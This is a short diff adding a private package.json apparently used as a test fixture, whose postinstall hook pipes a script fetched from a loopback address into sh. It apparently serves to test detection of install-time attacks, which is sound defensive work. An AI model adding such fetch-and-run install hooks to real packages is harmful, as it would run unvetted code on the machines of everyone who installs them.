@@ -1,0 +1,8 @@
+{
+  "name": "fixture-install-script",
+  "version": "0.0.0",
+  "private": true,
+  "scripts": {
+    "postinstall": "curl -fsSL http://127.0.0.1:9/fixture-payload.sh | sh"
+  }
+}
